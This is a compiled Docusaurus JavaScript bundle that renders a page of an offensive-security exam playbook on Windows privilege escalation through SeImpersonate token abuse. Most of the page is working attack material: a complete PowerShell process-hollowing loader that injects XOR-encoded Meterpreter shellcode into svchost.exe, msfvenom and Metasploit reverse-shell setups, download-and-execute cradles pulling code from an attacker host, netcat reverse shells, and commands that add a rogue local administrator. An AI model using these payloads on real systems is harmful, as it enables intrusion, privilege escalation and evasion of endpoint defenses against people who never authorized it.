"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[2569],{8057(e,n,s){s.r(n),s.d(n,{assets:()=>a,contentTitle:()=>l,default:()=>h,frontMatter:()=>i,metadata:()=>r,toc:()=>d});const r=JSON.parse('{"id":"osep/Privilege Escalation/Access Tokens - SeImpersonate","title":"Access Tokens - SeImpersonate","description":"Access Tokens - SeImpersonate","source":"@site/docs/osep/Privilege Escalation/Access Tokens - SeImpersonate.md","sourceDirName":"osep/Privilege Escalation","slug":"/osep/Privilege Escalation/Access Tokens - SeImpersonate","permalink":"/OSEP-Playbook/osep/Privilege Escalation/Access Tokens - SeImpersonate","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"SSHUTTLE","permalink":"/OSEP-Playbook/osep/Tunneling/SSHUTTLE"},"next":{"title":"AlwaysInstallElevated","permalink":"/OSEP-Playbook/osep/Privilege Escalation/AlwaysInstallElevated"}}');var t=s(4848),o=s(8453);const i={},l=void 0,a={},d=[{value:"<strong>Access Tokens - SeImpersonate</strong>",id:"access-tokens---seimpersonate",level:3},{value:"<strong>Impersonation with PrintSpoofer</strong>",id:"impersonation-with-printspoofer",level:3},{value:"<strong>Impersonation with Incognito Meterpreter</strong>",id:"impersonation-with-incognito-meterpreter",level:3},{value:"<strong>Impersonation with PrintSpooler</strong>",id:"impersonation-with-printspooler",level:3},{value:"<strong>SpoolSample and SharpPrintSpoofer - Custom Command</strong>",id:"spoolsample-and-sharpprintspoofer---custom-command",level:3},{value:"<strong>SpoolSample Modified - PS Rev Shell Loader</strong>",id:"spoolsample-modified---ps-rev-shell-loader",level:3},{value:"<strong>SigmaPotato .NET Reflection Memory Loading</strong>",id:"sigmapotato-net-reflection-memory-loading",level:3},{value:"<strong>FullPowers</strong>",id:"fullpowers",level:3}];function c(e){const n={a:"a",code:"code",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,o.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h3,{id:"access-tokens---seimpersonate",children:(0,t.jsx)(n.strong,{children:"Access Tokens - SeImpersonate"})}),"\n",(0,t.jsx)(n.h3,{id:"impersonation-with-printspoofer",children:(0,t.jsx)(n.strong,{children:"Impersonation with PrintSpoofer"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Tokens that allow Elevation of Privileges"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"SeImpersonatePrivilege"}),"\n",(0,t.jsx)(n.li,{children:"SeAssignPrimaryPrivilege"}),"\n",(0,t.jsx)(n.li,{children:"SeTcbPrivilege"}),"\n",(0,t.jsx)(n.li,{children:"SeBackupPrivilege"}),"\n",(0,t.jsx)(n.li,{children:"SeRestorePrivilege"}),"\n",(0,t.jsx)(n.li,{children:"SeCreateTokenPrivilege"}),"\n",(0,t.jsx)(n.li,{children:"SeLoadDriverPrivilege"}),"\n",(0,t.jsx)(n.li,{children:"SeTakeOwnershipPrivilege"}),"\n",(0,t.jsx)(n.li,{children:"SeDebugPrivilege"}),"\n"]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.strong,{children:"Requirements"}),"\xa0This one work if :"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["We have an User with\xa0",(0,t.jsx)(n.code,{children:"SeImpersonateAssigned"}),"\xa0both assigned and enabled."]}),"\n",(0,t.jsx)(n.li,{children:"We are in Windows 10 and Server 2016/2019."}),"\n",(0,t.jsxs)(n.li,{children:["For older versions use other potatoes:\xa0",(0,t.jsx)(n.a,{href:"https://github.com/emmasolis1/OSCP/tree/main/04.privilege_escalation/windows/potatoes",children:"GitHub Reference"})]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Steps"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"(Optional)"}),"\xa0Some steps to bypass UAC Controls like FodHelper could be needed."]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Check permissions"}),", see that\xa0",(0,t.jsx)(n.code,{children:"SeImpersonateAssigned"}),"\xa0is both\xa0",(0,t.jsx)(n.strong,{children:"assigned and enabled"})]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"whoami /priv\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Run the tool"}),",\xa0",(0,t.jsx)(n.a,{href:"https://github.com/itm4n/PrintSpoofer",children:"GitHub Repo"})]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"PrintSpoofer.exe -i -c [COMMAND_TO_RUN]\n\n# If you have a Meterpreter shell use either of these alternative modules\ngetsystem -t 5\ngetsystem -t 6\n\n"})}),"\n",(0,t.jsx)(n.h3,{id:"impersonation-with-incognito-meterpreter",children:(0,t.jsx)(n.strong,{children:"Impersonation with Incognito Meterpreter"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Steps"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Get a Meterpreter reverse shell"})}),"\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Load the module incognito"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"meterpreter > load incognito\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Find the user you want to impersonate"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"meterpreter > list_tokens -u\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Impersonate the user"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"meterpreter > impersonate_token [USER]\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.strong,{children:"Verify impersonation"})}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"meterpreter > getuid\n\n"})}),"\n",(0,t.jsx)(n.h3,{id:"impersonation-with-printspooler",children:(0,t.jsx)(n.strong,{children:"Impersonation with PrintSpooler"})}),"\n",(0,t.jsx)(n.h3,{id:"spoolsample-and-sharpprintspoofer---custom-command",children:(0,t.jsx)(n.strong,{children:"SpoolSample and SharpPrintSpoofer - Custom Command"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Steps"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Find if the target is vulnerable"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"# Check if we have SeImpersonate\nwhoami /priv\n\n# Check the directory spools to see if we can trigger it\nls [LOCAL_SERVER]\\pipe\\spoolss\nls [TARGET_SERVER].com\\pipe\\spoolss\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["Put\xa0",(0,t.jsx)(n.code,{children:"SharpPrintSpoofer.exe"}),"\xa0to listen, in this case it will be a command to add a new user but we could change this"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:'.\\SharpPrintSpoofer.exe \\\\.\\pipe\\test\\pipe\\spoolss "net user amit Password123! /add"\n.\\SharpPrintSpoofer.exe \\\\.\\pipe\\test\\pipe\\spoolss "net localgroup administrators amit /add"\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["Once it is listening, trigger the pipe using\xa0",(0,t.jsx)(n.code,{children:"SpoolSample.exe"}),"\xa0in other shell"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:".\\SpoolSample.exe [HOSTNAME] [HOSTNAME]/pipe/test\n\n"})}),"\n",(0,t.jsx)(n.h3,{id:"spoolsample-modified---ps-rev-shell-loader",children:(0,t.jsx)(n.strong,{children:"SpoolSample Modified - PS Rev Shell Loader"})}),"\n",(0,t.jsxs)(n.p,{children:["SpoolSampleModified including already the functionality of\xa0",(0,t.jsx)(n.code,{children:"SharpPrintSpoofer.exe"}),", thus this one binary can handle the privilege escalation."]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Steps"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Craft your payload"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=443 -f csharp EXITFUNC=thread\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["XOR Encrypt your shellcode with key\xa0",(0,t.jsx)(n.code,{children:"0xfa"})]}),"\n",(0,t.jsxs)(n.li,{children:["Insert your encrypted shellcode below, and save the file as\xa0",(0,t.jsx)(n.code,{children:"hollow.ps1"})]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f csharp EXITFUNC=thread\n# Shellcode should be XOR'd with key: 0xfa\n[Byte[]] $SHELLCODE = 0x06,0xB2...\n\n$key = 0xfa\n\n# Decoding routine\nfor ($i = 0; $i -lt $SHELLCODE.Length; $i++) {\n    $SHELLCODE[$i] = $SHELLCODE[$i] -bxor $key\n}\n\nfilter Get-Type ([string]$dllName,[string]$typeName)\n{\n    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals($dllName) )\n    {\n        $_.GetType($typeName)\n    }\n}\n\nfunction Get-Function\n{\n    Param(\n        [string] $module,\n        [string] $function\n    )\n\n    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )\n    {\n        throw \"Error: GetModuleHandle and GetProcAddress must be initialized first!\"\n    }\n\n    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))\n    $GetProcAddress.Invoke($null, @($moduleHandle, $function))\n}\n\nfunction Get-Delegate\n{\n    Param (\n        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,\n        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,\n        [Parameter(Position = 2)] [Type] $retType = [Void]\n    )\n\n    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).\n    DefineDynamicModule('QM', $false).\n    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')\n    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')\n    $delegate = $type.CreateType()\n\n    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)\n}\n\n# Obtain the required types via reflection\n$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()\n$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'\n$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'\n$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'\n$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'\n\n# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess\n$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')\n$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);\n$CreateProcess = $nativeMethodsType.GetMethod(\"CreateProcess\")\n\n# Obtain the function addresses of the required hollowing functions\n$ResumeThreadAddr = Get-Function \"kernel32.dll\" \"ResumeThread\"\n$ReadProcessMemoryAddr = Get-Function \"kernel32.dll\" \"ReadProcessMemory\"\n$WriteProcessMemoryAddr = Get-Function \"kernel32.dll\" \"WriteProcessMemory\"\n$ZwQueryInformationProcessAddr = Get-Function \"ntdll.dll\" \"ZwQueryInformationProcess\"\n\n# Create the delegate types to call the previously obtain function addresses\n$ResumeThread = Get-Delegate $ResumeThreadAddr @([IntPtr])\n$WriteProcessMemory = Get-Delegate $WriteProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int32], [IntPtr])\n$ReadProcessMemory = Get-Delegate $ReadProcessMemoryAddr @([IntPtr], [IntPtr], [Byte[]], [Int], [IntPtr]) ([Bool])\n$ZwQueryInformationProcess = Get-Delegate $ZwQueryInformationProcessAddr @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([Int])\n\n# Instantiate the required structures for CreateProcess and use them to launch svchost.exe\n$startupInformation = $startupInformationType.GetConstructors().Invoke($null)\n$processInformation = $processInformationType.GetConstructors().Invoke($null)\n\n$cmd = [System.Text.StringBuilder]::new(\"C:\\\\Windows\\\\System32\\\\svchost.exe\")\n$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))\n\n# Obtain the required handles from the PROCESS_INFORMATION structure\n$hThread = $processInformation.hThread\n$hProcess = $processInformation.hProcess\n\n# Create a buffer to hold the PROCESS_BASIC_INFORMATION structure and call ZwQueryInformationProcess\n$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)\n$ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, 0)\n\n# Locate the image base address. The address of the PEB is the second element within the PROCESS_BASIC_INFORMATION\n# structure (e.g. offset 0x08 within the $processBasicInformation buffer on x64). Within the PEB, the base image\n# addr is located at offset 0x10.\n$imageBaseAddrPEB = ([IntPtr]::new([BitConverter]::ToUInt64($processBasicInformation, 0x08) + 0x10))\n\n# Use ReadProcessMemory to read the required part of the PEB. We allocate already a buffer for 0x200\n# bytes that we will use later on. From the PEB we actually only need 0x08 bytes, as $imageBaseAddrPEB\n# already points to the correct memory location. We parse the obtained 0x08 bytes as Int64 and IntPtr.\n$memoryBuffer = [System.Byte[]]::CreateInstance([System.Byte], 0x200)\n$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPEB, $memoryBuffer, 0x08, 0)\n\n$imageBaseAddr = [BitConverter]::ToInt64($memoryBuffer, 0)\n$imageBaseAddrPointer = [IntPtr]::new($imageBaseAddr)\n\n# Now that we have the base address, we can read the first 0x200 bytes to obtain the PE file format header.\n# The offset of the PE header is at 0x3c within the PE file format header. Within the PE header, the relative\n# entry point address can be found at an offset of 0x28. We combine this with the $imageBaseAddr and have finally\n# found the non relative entry point address.\n$ReadProcessMemory.Invoke($hProcess, $imageBaseAddrPointer, $memoryBuffer, $memoryBuffer.Length, 0)\n\n$peOffset = [BitConverter]::ToUInt32($memoryBuffer, 0x3c)                               # PE header offset\n$entryPointAddrRelative = [BitConverter]::ToUInt32($memoryBuffer, $peOffset + 0x28)     # Relative entrypoint\n$entryPointAddr = [IntPtr]::new($imageBaseAddr + $entryPointAddrRelative)               # Absolute entrypoint\n\n# Overwrite the entrypoint with shellcode and resume the thread.\n$WriteProcessMemory.Invoke($hProcess, $entryPointAddr, $SHELLCODE, $SHELLCODE.Length, [IntPtr]::Zero)\n$ResumeThread.Invoke($hThread)\n\n# Close powershell to remove it as the parent of svchost.exe\nexit\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Start your HTTP Server"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"python3 -m http.server 80\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Start your listener"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost [ATTACKER_IP]; set lport 443; exploit"\n\n'})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Transfer it to the victim and run it"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:'SpoolSampleModified.exe [HOSTNAME] [HOSTNAME]/pipe/test "C:\\Windows\\System32\\cmd.exe /c powershell iex(iwr http://[ATTACKER_IP]/hollow.ps1 -useb)"\n\n'})}),"\n",(0,t.jsx)(n.h3,{id:"sigmapotato-net-reflection-memory-loading",children:(0,t.jsx)(n.strong,{children:"SigmaPotato .NET Reflection Memory Loading"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Steps"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Start your HTTP Server"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"python3 -m http.server 80\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Start your listener"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"nc -nvlp [PORT]\n\n"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"Load it and run it"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:'$WebClient = New-Object System.Net.WebClient\n\n$DownloadData = $WebClient.DownloadData("http(s)://[ATTACKER_IP]/SigmaPotato.exe")\n[System.Reflection.Assembly]::Load($DownloadData)\n\n# Execute Command\n[SigmaPotato]::Main("[COMMAND]")\n\n# Establish a PowerShell Reverse Shell (one-liner)\n[SigmaPotato]::Main(@("--revshell","[ATTACKER_IP","[PORT]"))\n\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:(0,t.jsx)(n.a,{href:"https://github.com/tylerdotrar/SigmaPotato",children:"SigmaPotato GitHub Reference"})}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"fullpowers",children:(0,t.jsx)(n.strong,{children:"FullPowers"})}),"\n",(0,t.jsxs)(n.p,{children:["Sometimes we get access to a machine with what seems to be a privilege service account but this account has almost non or very little permissions enabled, in this case we can use this tool,\xa0",(0,t.jsx)(n.a,{href:"https://www.emmanuelsolis.com/resources/privilege_escalation/FullPowers.exe",children:(0,t.jsx)(n.code,{children:"FullPowers.exe"})}),", to\xa0",(0,t.jsx)(n.strong,{children:"automatically recover the default privilege set of a service account"}),", including the permissions\xa0",(0,t.jsx)(n.code,{children:"SeAssignPrimaryToken"}),"\xa0and\xa0",(0,t.jsx)(n.code,{children:"SeImpersonate"}),"\xa0which are very popular to escalate privileges."]}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["Start the\xa0",(0,t.jsx)(n.strong,{children:"Python Server"}),":"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"python3 -m http.server 80\n\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/fullpowers_1.png",alt:"FullPowers"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Bring the Executable to the victim"}),":"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"# CMD\ncerutil.exe -urlcache -split -f http://[kali_ip]/FullPowers.exe\n\n# PowerShell\niwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe\n\n"})}),"\n",(0,t.jsx)(n.p,{children:"FullPowers Execution"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/fullpowers_2.png",alt:"FullPowers Execution"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:["Run the\xa0",(0,t.jsx)(n.strong,{children:"Executable"}),":"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:'# Basic Usage\n./FullPowers.exe\n\n# Trying to get an extended set of privileges (might fail with NETWORK SERVICE)\n./FullPowers.exe -x\n\n# Specify a command line to run\n./FullPowers.exe -c "powershell -ep Bypass"\n\n# Start a reverse shell to the attacker machine (requires that you previously bring Netcat to the victim)\n./FullPowers.exe -c "C:\\Temp\\nc64.exe [kali_ip] [port] -e cmd" -z\n\n'})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/fullpowers_3.png",alt:"FullPowers"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Verify"}),"\xa0that you have now an elevated set of privileges:"]}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-powershell",children:"whoami /priv\n\n"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/fullpowers_4.png",alt:"FullPowers"})}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Execute your Malicious Actions"}),": if you have now, for example, the permission\xa0",(0,t.jsx)(n.code,{children:"SeImpersonate"}),"\xa0you could use\xa0",(0,t.jsx)(n.code,{children:"PrintSpoofer.exe"}),"\xa0or\xa0",(0,t.jsx)(n.code,{children:"GodPotato.exe"}),"\xa0to elevate your privileges."]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/fullpowers_5.png",alt:"FullPowers"})})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},8453(e,n,s){s.d(n,{R:()=>i,x:()=>l});var r=s(6540);const t={},o=r.createContext(t);function i(e){const n=r.useContext(o);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),r.createElement(o.Provider,{value:n},e.children)}}}]);